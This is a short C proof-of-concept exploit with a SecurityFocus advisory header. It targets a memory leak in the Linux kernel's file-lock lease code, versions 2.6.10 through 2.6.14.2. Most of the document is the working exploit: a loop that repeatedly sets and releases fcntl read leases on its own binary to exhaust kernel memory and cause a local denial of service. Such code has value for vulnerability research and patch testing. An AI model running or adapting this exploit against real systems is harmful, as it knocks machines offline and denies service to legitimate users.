/*
source: http://www.securityfocus.com/bid/15745/info

Linux kernel is susceptible to a local denial-of-service vulnerability.

This issue is triggered when excessive kernel memory is consumed by numerous file-lock leases. This problem stems from a memory leak in the kernel's file-lock lease code.

This issue allows local attackers to consume excessive kernel memory, eventually leading to an out-of-memory condition and ultimately to a denial of service for legitimate users.

Kernel versions from 2.6.10 through to 2.6.14.2 are vulnerable to this issue. 
*/


#include <unistd.h>

#include <stdlib.h>

#include <linux/fcntl.h>

int main(int ac, char **av)

{

    char *fname = av[0];

    int fd = open(fname, O_RDONLY);

    int r;

    

    while (1) {

        r = fcntl(fd, F_SETLEASE, F_RDLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_RDLCK");

            exit(1);

        }

        r = fcntl(fd, F_SETLEASE, F_UNLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_UNLCK");

            exit(1);

        }

    }

    return 0;

}